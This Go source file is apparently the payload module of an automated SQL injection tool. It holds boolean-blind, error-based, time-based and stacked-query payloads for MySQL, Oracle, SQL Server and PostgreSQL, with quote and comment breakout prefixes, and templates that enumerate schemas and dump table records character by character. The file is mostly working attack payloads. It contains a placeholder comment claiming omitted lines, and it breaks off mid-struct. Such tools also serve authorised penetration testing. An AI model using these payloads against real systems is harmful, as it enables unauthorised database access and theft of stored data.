package payloads

// PayloadComment defines the prefix and suffix for a payload
type PayloadComment struct {
	Pref string `json:"pref"`
	Suf  string `json:"suf"`
}

// Payload defines a single injection test case
type Payload struct {
	Payload  string           `json:"payload"`
	Comments []PayloadComment `json:"comments"`
	Title    string           `json:"title"`
	Vector   string           `json:"vector"`
	Dbms     string           `json:"dbms"`
}

// Payloads holds the dictionary of all test vectors
type PayloadCollection struct {
	BooleanTests map[string][]Payload
	ErrorTests   map[string][]Payload
	TimeTests    map[string][]Payload
	StackedTests map[string][]Payload
}

var GlobalPayloads *PayloadCollection

var NumberOfCharactersPayloads = map[string]string{
	"MySQL":                "LENGTH(LENGTH({query}))={char}",
	"Oracle":               "LENGTH(LENGTH({query}))={char}",
	"Microsoft SQL Server": "LEN(LEN({query}))={char}",
	"PostgreSQL":           "LENGTH(LENGTH({query}::text)::text)={char}",
}

var LengthPayloads = map[string][]string{
	"MySQL": {
		"ORD(MID(LENGTH({query}),{position},1))={char}",
		"ORD(MID(IFNULL(LENGTH({query}),0),{position},1))={char}",
		"ORD(MID(IFNULL(CAST(LENGTH({query}) AS NCHAR),0),{position},1))={char}",
	},
	"Oracle": {
		"ASCII(SUBSTRC(LENGTH({query}),{position},1))={char}",
		"ASCII(SUBSTRC(NVL(LENGTH({query}),0),{position},1))={char}",
		"ASCII(SUBSTRC(NVL(CAST(LENGTH({query}) AS VARCHAR(4000)),0),{position},1))={char}",
	},
	"Microsoft SQL Server": {
		"ASCII(RIGHT(LEFT(LTRIM(STR(LEN({query}))),{position}),1))={char}",
		"UNICODE(SUBSTRING(LTRIM(STR(LEN({query}))),{position},1))={char}",
		"UNICODE(SUBSTRING(LEN({query}),{position},1))={char}",
		"UNICODE(SUBSTRING(ISNULL(CAST(LEN({query}) AS NVARCHAR(4000)),0),{position},1))={char}",
	},
	"PostgreSQL": {
		"ASCII(SUBSTRING(LENGTH({query}::text)::text FROM {position} FOR 1))={char}",
		"ASCII(SUBSTRING(COALESCE(LENGTH({query})::text,CHR(48))::text FROM {position} FOR 1))={char}",
		"ASCII(SUBSTRING(COALESCE(CAST(LENGTH({query})::text AS VARCHAR(10000))::text,CHR(32))::text FROM {position} FOR 1))={char}",
	},
}

var DataExtractionPayloads = map[string]map[string]string{
	"MySQL": {
		"no-cast": "ORD(MID({query},{position},1))={char}",
		"isnull":  "ORD(MID(IFNULL({query},0x20),{position},1))={char}",
		"cast":    "ORD(MID(IFNULL(CAST({query} AS NCHAR),0x20),{position},1))={char}",
	},
	"Oracle": {
		"no-cast": "ASCII(SUBSTRC({query},{position},1))={char}",
		"isnull":  "ASCII(SUBSTRC(NVL({query},CHR(32)),{position},1))={char}",
		"cast":    "ASCII(SUBSTRC(NVL(CAST({query} AS NVARCHAR(4000)),CHR(32)),{position},1))={char}",
	},
	"Microsoft SQL Server": {
		"ascii-left-right": "ASCII(RIGHT(LEFT({query},{position}),1))={char}",
		"no-cast":          "UNICODE(SUBSTRING({query},{position},1))={char}",
		"isnull":           "UNICODE(SUBSTRING(ISNULL({query},' '),{position},1))={char}",
		"cast":             "UNICODE(SUBSTRING(ISNULL(CAST({query} AS NVARCHAR(4000)),' '),{position},1))={char}",
	},
	"PostgreSQL": {
		"no-cast": "ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}",
		"isnull":  "ASCII(SUBSTRING((COALESCE({query}::text,CHR(32)))::text FROM {position} FOR 1))={char}",
		"cast":    "ASCII(SUBSTRING((COALESCE(CAST({query} AS VARCHAR(10000))::text,CHR(32)))::text FROM {position} FOR 1))={char}",
	},
}

var ErrorRegexes = []string{
	`(?isx)(XPATH.*error\s*:\s*\'~(?:\()?(?P<error_based_response>.*?))\'\`,
	`(?is)(?:Duplicate\s*entry\s*(['\"])(?P<error_based_response>(.*?))(?:~)?(?:1)?\1)`,
	`(?isx)(BIGINT.*\s.*Injected~(?:\()?(?P<error_based_response>.*?))\~END`,
	`(?isx)(DOUBLE.*\s.*Injected~(?:\()?(?P<error_based_response>.*?))\~END`,
	`(?isx)(Illegal.*geometric.*\s.*Injected~(?:\()?(?P<error_based_response>.*?))\~END`,
	`(?isx)(?:Malformed.*?GTID.*?set.*?specification.*?\'Injected~(?:\()?(?P<error_based_response>.*?))\~END`,
	`(?isx)(?:Injected~(?:\()?(?P<error_based_response>.*?))\~END`,
	`(?isx)(?:(?:r0oth3x49|START)~(?P<error_based_response>.*?)\~END)`,
	`(?is)(?:['\"]injected~(?:(?:\()?(?P<error_based_response>(.*?))(?:\()?\~END['\"])`,
	`(?isx)(?:'(?:~(?P<error_based_response>.*?))')`,
}

var PayloadsBanner = map[string][]string{
	"MySQL": {
		"VERSION()",
		"@@VERSION",
		"@@GLOBAL_VERSION",
		"@@VERSION_COMMENT",
		"VERSION/**_**/()",
		"VERSION/*!50000()*/",
	},
	"Oracle": {
		"(SELECT banner FROM v$version WHERE ROWNUM=1)",
		"(SELECT version FROM v$instance)",
		"(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')",
	},
	"Microsoft SQL Server": {
		"@@VERSION",
		"(SELECT @@VERSION)",
	},
	"PostgreSQL": {
		"VERSION()",
		"(SELECT version())",
	},
}

var PayloadsCurrentUser = map[string][]string{
	"MySQL": {
		"CURRENT_USER",
		"USER()",
		"SESSION_USER()",
		"SYSTEM_USER()",
		"USER_NAME()",
	},
	"Oracle": {
		"(SELECT USER FROM DUAL)",
	},
	"Microsoft SQL Server": {
		"CURRENT_USER",
		"SYSTEM_USER",
		"user",
		"user_name()",
		"(SELECT SYSTEM_USER)",
		"(SELECT user)",
		"(SELECT user_name())",
		"(SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID)",
	},
	"PostgreSQL": {
		"CURRENT_USER",
		"(SELECT usename FROM pg_user)",
		"(SELECT user)",
		"(SELECT session_user)",
		"(SELECT getpgusername())",
	},
}

var PayloadsCurrentDatabase = map[string][]string{
	"MySQL": {
		"DATABASE()",
		"SCHEMA()",
		"SCHEMA/*!50000()*/",
		"DATABASE/**_**/()",
		"DATABASE/*!50000()*/",
	},
	"Oracle": {
		"(SELECT USER FROM DUAL)",
		"(SELECT SYS.DATABASE_NAME FROM DUAL)",
		"(SELECT global_name FROM global_name)",
		"(SELECT name FROM v$database)",
		"(SELECT instance_name FROM v$instance)",
	},
	"Microsoft SQL Server": {
		"DB_NAME()",
		"(SELECT DB_NAME())",
	},
	"PostgreSQL": {
		"CURRENT_SCHEMA()",
		"(SELECT current_database())",
	},
}

var PayloadsHostname = map[string][]string{
	"MySQL": {
		"@@HOSTNAME",
	},
	"Oracle": {
		"(SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL)",
		"(SELECT host_name FROM v$instance)",
	},
	"Microsoft SQL Server": {
		"@@SERVERNAME",
		"HOST_NAME()",
		"(SELECT HOST_NAME())",
	},
	"PostgreSQL": {
		"(SELECT CONCAT(boot_val) FROM pg_settings WHERE name='listen_addresses' GROUP BY boot_val)",
		"(SELECT inet_server_addr())",
	},
}

var PayloadsDbsCount = map[string][]string{
	"MySQL": {
		"(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.SCHEMATA))",
		"(/*!50000SELECT*/ COUNT(*)/*!50000FROM*//*!50000(INFORMATION_SCHEMA.SCHEMATA)*/)",
	},
	"PostgreSQL": {
		"(SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables)",
		"(SELECT COUNT(datname) FROM pg_database)",
	},
	"Microsoft SQL Server": {
		"(SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases)",
		"(SELECT LTRIM(STR(COUNT(*))) FROM sys.databases)",
	},
	"Oracle": {
		"(SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES)",
	},
}

var PayloadsDbsNames = map[string][]string{
	"MySQL": {
		"(SELECT SCHEMA_NAME FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
		"(SELECT IFNULL(SCHEMA_NAME,0x20) FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
	},
	"PostgreSQL": {
		"(SELECT DISTINCT(schemaname) FROM pg_tables ORDER BY schemaname OFFSET 0 LIMIT 1)",
		"(SELECT datname FROM pg_database ORDER BY datname OFFSET 0 LIMIT 1)",
	},
	"Microsoft SQL Server": {
		"(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases ORDER BY name) ORDER BY name)",
		"(SELECT DB_NAME(0))",
	},
	"Oracle": {
		"(SELECT OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT=1)",
	},
}

var PayloadsTblsCount = map[string][]string{
	"MySQL": {
		"(SELECT+COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA='%s'))",
	},
	"PostgreSQL": {
		"(SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME='%s')",
	},
	"Microsoft SQL Server": {
		"(SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)))",
		"(SELECT LTRIM(STR(COUNT(TABLE_NAME))) FROM information_schema.tables WHERE table_catalog='%s')",
	},
	"Oracle": {
		"(SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE OWNER='%s')",
	},
}

var PayloadsTblsNames = map[string][]string{
	"MySQL": {
		"(SELECT TABLE_NAME FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA='%s')LIMIT 0,1)",
	},
	"PostgreSQL": {
		"(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME='%s' OFFSET 0 LIMIT 1)",
	},
	"Microsoft SQL Server": {
		"(SELECT TOP 1 name FROM %s..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) AND name NOT IN (SELECT TOP 0 name FROM %s..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) ORDER BY name) ORDER BY name)",
	},
	"Oracle": {
		"(SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE LIMIT=1)",
	},
}

var PayloadsColsCount = map[string][]string{
	"MySQL": {
		"(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA='%s')AND(TABLE_NAME='%s'))",
	},
	"PostgreSQL": {
		"(SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s')",
	},
	"Microsoft SQL Server": {
		"(SELECT LTRIM(STR(COUNT(name))) FROM %s..syscolumns WHERE id=(SELECT id FROM %s..sysobjects WHERE name='%s'))",
	},
	"Oracle": {
		"(SELECT COUNT(COLUMN_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='%s' AND TABLE_NAME='%s')",
	},
}

var PayloadsColsNames = map[string][]string{
	"MySQL": {
		"(SELECT COLUMN_NAME FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA='%s')AND(TABLE_NAME='%s')LIMIT 0,1)",
	},
	"PostgreSQL": {
		"(SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s' OFFSET 0 LIMIT 1)",
	},
	"Microsoft SQL Server": {
		"(SELECT TOP 1 name FROM %s..syscolumns WHERE id=(SELECT id FROM %s..sysobjects WHERE name='%s') AND name NOT IN (SELECT TOP 0 name FROM %s..syscolumns WHERE id=(SELECT id FROM %s..sysobjects WHERE name='%s') ORDER BY name) ORDER BY name)",
	},
	"Oracle": {
		"(SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='%s' AND TABLE_NAME='%s') WHERE LIMIT=1)",
	},
}

var PayloadsRecsCount = map[string][]string{
	"MySQL": {
		"(SELECT COUNT(*)FROM %s.%s)",
	},
	"PostgreSQL": {
		"(SELECT COUNT(*)::text FROM %s.%s)",
	},
	"Microsoft SQL Server": {
		"(SELECT LTRIM(STR(COUNT(*))) FROM %s..%s)",
	},
	"Oracle": {
		"(SELECT COUNT(*) FROM %s.%s)",
	},
}

var PayloadsRecsDump = map[string][]string{
	"MySQL": {
		"(SELECT %s FROM %s.%s LIMIT 0,1)",
	},
	"PostgreSQL": {
		"(SELECT %s::text FROM %s.%s OFFSET 0 LIMIT 1)",
	},
	"Microsoft SQL Server": {
		"(SELECT TOP 1 %s FROM %s..%s WHERE %s NOT IN (SELECT TOP 0 %s FROM %s..%s))",
	},
	"Oracle": {
		"(SELECT %s FROM (SELECT %s,ROWNUM AS LIMIT FROM %s.%s) WHERE LIMIT=1)",
	},
}

// ... (Lines 27-139 assumed unchanged) ...

func Init() {
	GlobalPayloads = &PayloadCollection{
		BooleanTests: map[string][]Payload{
			"boolean-based": GetBooleanTests(),
		},
		ErrorTests: map[string][]Payload{
			"error-based": GetErrorTests(),
		},
		TimeTests: map[string][]Payload{
			"time-based": GetTimeTests(),
		},
		StackedTests: map[string][]Payload{
			"stacked-queries": GetStackedTests(),
		},
	}
}

// GetStackedTests returns stacked queries payloads
func GetStackedTests() []Payload {
	return []Payload{
		// MySQL
		{
			Payload: "(SELECT(1)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
			Comments: []PayloadComment{
				{Pref: ";", Suf: "--"},
				{Pref: ",", Suf: "--"},
				{Pref: "';", Suf: "--"},
				{Pref: "\";", Suf: "--"},
				{Pref: ");", Suf: "--"},
				{Pref: "');", Suf: "--"},
				{Pref: "\");", Suf: "--"},
			},
			Title:  "MySQL >= 5.0.12 stacked queries (query SLEEP)",
			Vector: "(SELECT(1)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
			Dbms:   "MySQL",
		},
		{
			Payload: "if(now()=sysdate(),sleep([SLEEPTIME]),0)",
			Comments: []PayloadComment{
				{Pref: ";", Suf: "--"},
				{Pref: ",", Suf: "--"},
				{Pref: "';", Suf: "--"},
				{Pref: "\";", Suf: "--"},
				{Pref: ");", Suf: "--"},
				{Pref: "');", Suf: "--"},
				{Pref: "\");", Suf: "--"},
			},
			Title:  "MySQL >= 5.0.12 stacked queries (query SLEEP - comment)",
			Vector: "if([INFERENCE],sleep([SLEEPTIME]),0)",
			Dbms:   "MySQL",
		},

		// Microsoft SQL Server
		{
			Payload: "WAITFOR DELAY '0:0:[SLEEPTIME]'",
			Comments: []PayloadComment{
				{Pref: ";", Suf: ""},
				{Pref: "';", Suf: ""},
				{Pref: "\";", Suf: ""},
				{Pref: ");", Suf: ""},
				{Pref: "');", Suf: ""},
				{Pref: "\");", Suf: ""},
			},
			Title:  "Microsoft SQL Server/Sybase stacked queries",
			Vector: "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
			Dbms:   "Microsoft SQL Server",
		},

		// PostgreSQL
		{
			Payload: "(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
			Comments: []PayloadComment{
				{Pref: ";", Suf: ""},
				{Pref: "';", Suf: "--"},
				{Pref: "\";", Suf: "--"},
				{Pref: ");", Suf: "--"},
				{Pref: "');", Suf: "--"},
				{Pref: "\");", Suf: "--"},
			},
			Title:  "PostgreSQL > 8.1 stacked queries",
			Vector: "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
			Dbms:   "PostgreSQL",
		},

		// Oracle
		{
			Payload: "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) FROM DUAL)",
			Comments: []PayloadComment{
				{Pref: ";", Suf: ""},
				{Pref: "';", Suf: "--"},
				{Pref: "\";", Suf: "--"},
				{Pref: ");", Suf: "--"},
				{Pref: "');", Suf: "--"},
				{Pref: "\");", Suf: "--"},
			},
			Title:  "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
			Vector: "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) ELSE 5238 END)",
			Dbms:   "Oracle",
		},
		{
			Payload: "BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END",
			Comments: []PayloadComment{
				{Pref: ";", Suf: ""},
				{Pref: "';", Suf: "--"},
				{Pref: "\";", Suf: "--"},
				{Pref: ");", Suf: "--"},
				{Pref: "');", Suf: "--"},
				{Pref: "\");", Suf: "--"},
			},
			Title:  "Oracle stacked queries (DBMS_LOCK.SLEEP - comment)",
			Vector: "BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END",
			Dbms:   "Oracle",
		},
	}
}

// GetBooleanTests returns booleantests payloads
func GetBooleanTests() []Payload {
	return []Payload{
		{
			Payload: "AND [RANDNUM]=[RANDNUM]",
			Comments: []PayloadComment{
				{Pref: " ", Suf: ""},
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: " OR '04586'='4586"},
				{Pref: "\" ", Suf: " OR \"04586\"=\"4586"},
				{Pref: ") ", Suf: " AND (04586=4586"},
				{Pref: ") ", Suf: " OR (04586=4586"},
				{Pref: "') ", Suf: " AND ('04586'='4586"},
				{Pref: "\") ", Suf: " AND (\"04586\"=\"4586"},
				{Pref: "' ", Suf: " AND '04586'='4586"},
				{Pref: "\" ", Suf: " AND \"04586\"=\"4586"},
				{Pref: "') ", Suf: " OR ('04586'='4586"},
				{Pref: "\") ", Suf: " OR (\"04586\"=\"4586"},
			},
			Title:  "AND boolean-based blind - WHERE or HAVING clause",
			Vector: "AND [INFERENCE]",
			Dbms:   "",
		},
		{
			Payload: "OR NOT [RANDNUM]=[RANDNUM]",
			Comments: []PayloadComment{
				{Pref: " ", Suf: ""},
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: " AND (04586=4586"},
				{Pref: "') ", Suf: " AND ('04586'='4586"},
				{Pref: "\") ", Suf: " AND (\"04586\"=\"4586"},
				{Pref: "' ", Suf: " AND '04586'='4586"},
				{Pref: "\" ", Suf: " AND \"04586\"=\"4586"},
			},
			Title:  "OR boolean-based blind - WHERE or HAVING clause (NOT)",
			Vector: "OR NOT [INFERENCE]",
			Dbms:   "",
		},
		{
			Payload: "OR [RANDNUM]=[RANDNUM]",
			Comments: []PayloadComment{
				{Pref: " ", Suf: ""},
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: " AND (04586=4586"},
				{Pref: ") ", Suf: " OR (04586=4586"},
				{Pref: "') ", Suf: " AND ('04586'='4586"},
				{Pref: "\") ", Suf: " AND (\"04586\"=\"4586"},
				{Pref: "' ", Suf: " AND '04586'='4586"},
				{Pref: "\" ", Suf: " AND \"04586\"=\"4586"},
				{Pref: "') ", Suf: " OR ('04586'='4586"},
				{Pref: "\") ", Suf: " OR (\"04586\"=\"4586"},
				{Pref: "' ", Suf: " OR '04586'='4586--"},
				{Pref: "\" ", Suf: " OR \"04586\"=\"4586--"},
			},
			Title:  "OR boolean-based blind - WHERE or HAVING clause",
			Vector: "OR [INFERENCE]",
			Dbms:   "",
		},
		{
			Payload: "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
			Comments: []PayloadComment{
				{Pref: "", Suf: ""},
				{Pref: " ", Suf: "--"},
				{Pref: "' AND 0546=", Suf: "--"},
				{Pref: "\" AND 0456=", Suf: "--"},
				{Pref: ") AND 0866=", Suf: "--"},
				{Pref: "') AND 0758=", Suf: "--"},
				{Pref: "\") AND 0541=", Suf: "--"},
			},
			Title:  "Boolean-based blind - Parameter replace",
			Vector: "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
			Dbms:   "",
		},
		{
			Payload: "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
			Comments: []PayloadComment{
				{Pref: "", Suf: ""},
			},
			Title:  "Boolean-based blind - Parameter replace (original value)",
			Vector: "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
			Dbms:   "",
		},
		{
			Payload: "(SELECT CASE WHEN([RANDNUM]=[RANDNUM]) THEN 9854 ELSE 0 END)",
			Comments: []PayloadComment{
				{Pref: "", Suf: ""},
				{Pref: "", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "\"AND", Suf: "AND\"Z"},
				{Pref: "'AND", Suf: "AND'Z"},
				{Pref: "'XOR", Suf: "XOR'Z"},
				{Pref: "\"XOR", Suf: "XOR\"Z"},
				{Pref: "'OR", Suf: "OR'Z"},
				{Pref: "\"OR", Suf: "OR\"Z"},
				{Pref: " AND 9854=", Suf: "-- wXyW"},
				{Pref: " OR 9854=", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)",
			Vector: "(SELECT CASE WHEN([INFERENCE]) THEN 9854 ELSE 0 END)",
			Dbms:   "",
		},
	}
}

// ErrorRegexMap contains the regular expressions for matching error messages
var ErrorRegexMap = map[string]string{
	"XPATH":          `(?is)(XPATH.*error\s*:\s*\'~(?:\()?(?P<result>.*?))\'`,
	"ERROR_BASED":    `(?is)(?:Duplicate\s*entry\s*(['"])(?P<result>(.*?))(?:~)?(?:1)?\1)`,
	"BIGINT":         `(?is)(BIGINT.*\s.*Injected~(?:\()?(?P<result>.*?))\~END`,
	"DOUBLE":         `(?is)(DOUBLE.*\s.*Injected~(?:\()?(?P<result>.*?))\~END`,
	"GEOMETRIC":      `(?is)(Illegal.*geometric.*\s.*Injected~(?:\()?(?P<result>.*?))\~END`,
	"GTID":           `(?is)(?:Malformed.*?GTID.*?set.*?specification.*?\'Injected~(?:\()?(?P<result>.*?))\~END`,
	"JSON_KEYS":      `(?is)(?:Injected~(?:\()?(?P<result>.*?))\~END`,
	"GENERIC":        `(?is)(?:(?:r0oth3x49|START)~(?P<result>.*?)\~END)`,
	"GENERIC_ERRORS": `(?is)(?:['"]injected~(?:(?:\()?(?P<result>(.*?))(?:\()?~END['"]))`,
	"MSSQL_STRING":   `(?is)(?:'(?:~(?P<result>.*?))')`,
}

// GetErrorTests returns errortests payloads
func GetErrorTests() []Payload {
	return []Payload{
		// MySQL
		{
			Payload: "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: " ", Suf: "#"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "#"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "#"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "#"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "#"},
				{Pref: "\") ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "#"},
			},
			Title:  "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",
			Vector: "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
			Dbms:   "MySQL",
		},
		{
			Payload: "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: " ", Suf: "#"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "#"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "#"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "#"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "#"},
				{Pref: "\") ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "#"},
			},
			Title:  "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)",
			Vector: "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
			Dbms:   "MySQL",
		},
		{
			Payload: "AND EXTRACTVALUE(0,CONCAT(0x7e,0x72306f746833783439,0x7e))",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: " ", Suf: "#"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "#"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "#"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "#"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "#"},
				{Pref: "\") ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "#"},
			},
			Title:  "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
			Vector: "AND EXTRACTVALUE(0,CONCAT(0x7e,[INFERENCE],0x7e))",
			Dbms:   "MySQL",
		},

		// Microsoft SQL Server
		{
			Payload: "AND 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
			},
			Title:  "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause",
			Vector: "AND 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
			Dbms:   "Microsoft SQL Server",
		},
		{
			Payload: "OR 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
			},
			Title:  "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause",
			Vector: "OR 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
			Dbms:   "Microsoft SQL Server",
		},

		// PostgreSQL
		{
			Payload: "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
			},
			Title:  "PostgreSQL AND error-based - WHERE or HAVING clause",
			Vector: "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
			Dbms:   "PostgreSQL",
		},
		{
